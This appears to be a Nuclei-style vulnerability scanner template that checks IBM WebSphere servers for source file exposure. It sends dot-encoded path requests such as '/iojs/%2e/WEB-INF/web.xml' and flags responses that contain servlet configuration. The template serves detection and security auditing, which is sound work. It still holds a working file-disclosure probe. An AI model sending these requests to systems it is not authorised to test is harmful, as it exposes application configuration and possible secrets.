http:
- matchers:
  - condition: and
    part: body
    type: word
    words:
    - </web-app>
    - <servlet>
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/iojs/%2e/WEB-INF/web.xml'
  - '{{BaseURL}}/iojs/%2e/WEB-INF/'
  - '{{BaseURL}}/iojs/%2e/META-INF/'
  - '{{BaseURL}}/iojs/%2e/WEB-INF/web.xml'
  - '{{BaseURL}}/iojs/%2e/META-INF/web.xml'
  stop-at-first-match: true
id: ibm-websphere-exposure
info:
  author: r3nz0
  description: 'Disclose application specific files contained within the war file,
    including files under the web-inf and meta-inf directories.

    '
  metadata:
    verified: 'true'
  name: IBM WebSphere application - Source File Exposure
  reference:
  - https://www.acunetix.com/vulnerabilities/web/ibm-websphere-weblogic-application-source-file-exposure/
  severity: medium
  tags: java
